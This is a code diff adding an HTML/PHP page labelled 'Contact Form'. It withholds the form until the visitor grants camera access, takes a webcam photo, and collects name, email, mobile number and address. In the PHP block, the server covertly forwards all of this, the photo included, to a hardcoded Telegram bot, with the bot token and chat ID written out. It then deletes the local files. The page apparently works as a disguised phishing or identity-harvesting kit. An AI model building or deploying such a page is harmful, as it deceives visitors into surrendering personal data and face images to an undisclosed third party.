@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Profile and Contact Form</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            width: 100%;
+            display: none; /* Hidden initially */
+        }
+        .error-message {
+            text-align: center;
+            font-size: 18px;
+            color: red;
+        }
+        h2 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        input[type="text"], input[type="email"], input[type="tel"], textarea {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        textarea {
+            height: 100px;
+            resize: none;
+        }
+        #videoElement, #canvasElement {
+            width: 100%;
+            margin-bottom: 10px;
+            display: none; /* Hidden by default */
+        }
+        #capture, #submitBtn {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: none;
+            color: #fff;
+            cursor: pointer;
+            background-color: #007BFF;
+            display: none; /* Hidden by default */
+            transition: background-color 0.3s;
+        }
+        #capture:hover, #submitBtn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="formContainer">
+    <h2>Contact Form</h2>
+    <form id="contactForm" method="POST" enctype="multipart/form-data">
+        <input type="text" name="name" placeholder="Enter your name" required>
+        <input type="email" name="email" placeholder="Enter your email" required>
+        <input type="tel" name="mobile" placeholder="Enter your valid mobile number" required>
+        <textarea name="address" placeholder="Enter your address" required></textarea>
+        <video id="videoElement" autoplay></video>
+        <canvas id="canvasElement"></canvas>
+        <button type="button" id="capture">Capture Image</button>
+        <input type="hidden" name="image_data" id="image_data">
+        <button type="submit" id="submitBtn">Submit</button>
+    </form>
+</div>
+
+<p class="error-message" id="errorMessage" style="display: none;">Please allow camera access to proceed.</p>
+
+<script>
+    const videoElement = document.getElementById('videoElement');
+    const canvasElement = document.getElementById('canvasElement');
+    const captureButton = document.getElementById('capture');
+    const imageDataInput = document.getElementById('image_data');
+    const submitButton = document.getElementById('submitBtn');
+    const formContainer = document.getElementById('formContainer');
+    const errorMessage = document.getElementById('errorMessage');
+
+    // Access the device camera and stream to video element
+    navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            videoElement.srcObject = stream;
+            videoElement.style.display = 'block';
+            captureButton.style.display = 'block';
+            // Show the form container after accessing the camera
+            formContainer.style.display = 'block';
+        })
+        .catch(error => {
+            console.error("Error accessing webcam: ", error);
+            // Show error message if camera access is denied
+            errorMessage.style.display = 'block';
+        });
+
+    // Capture the image from video stream
+    captureButton.addEventListener('click', () => {
+        const context = canvasElement.getContext('2d');
+        canvasElement.width = videoElement.videoWidth;
+        canvasElement.height = videoElement.videoHeight;
+        context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
+        const imageData = canvasElement.toDataURL('image/png');
+        imageDataInput.value = imageData;
+
+        alert("Image captured successfully!");
+
+        // Show the submit button after capturing the image
+        submitButton.style.display = 'block';
+    });
+</script>
+
+<?php
+if ($_SERVER['REQUEST_METHOD'] == 'POST') {
+    $name = $_POST['name'];
+    $email = $_POST['email'];
+    $mobile = $_POST['mobile'];
+    $address = $_POST['address'];
+    $image_data = $_POST['image_data'];
+
+    // Save data in JSON file
+    $data = [
+        'name' => $name,
+        'email' => $email,
+        'mobile' => $mobile,
+        'address' => $address,
+        'timestamp' => time()
+    ];
+
+    $json_data = json_encode($data);
+    $json_file = 'data_' . time() . '.json';
+    file_put_contents($json_file, $json_data);
+
+    // Decode the base64 image data
+    list($type, $image_data) = explode(';', $image_data);
+    list(, $image_data)      = explode(',', $image_data);
+    $image_data = base64_decode($image_data);
+
+    // Save the image as a PNG file
+    $image_file = 'image_' . time() . '.png';
+    file_put_contents($image_file, $image_data);
+
+    // Send data and image to Telegram bot
+    $telegram_url = "https://api.telegram.org/bot7203772796:AAGWZvXP0BCklNDPpzbI4aKouwTt2a8NpfY/sendPhoto";
+    $message = "New Contact Submission:\n\n" .
+               "Name: $name\n" .
+               "Email: $email\n" .
+               "Mobile: $mobile\n" .
+               "Address: $address\n";
+
+    $chat_id = '1884399160';
+
+    $post_fields = [
+        'chat_id' => $chat_id,
+        'caption' => $message,
+        'photo' => new CURLFile(realpath($image_file))
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $telegram_url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $response = curl_exec($ch);
+    curl_close($ch);
+
+    // Check for errors
+    if ($response === false) {
+        echo 'Telegram API request failed.';
+    } else {
+        // Delete the files after sending
+        unlink($image_file);
+        unlink($json_file);
+
+        // JavaScript redirection after submission
+        echo "<script type='text/javascript'>
+        alert('Form submitted successfully!');
+        window.location.href = 'pr.html';
+      </script>";
+exit();
+    }
+}
+?>
+</body>
+</html>
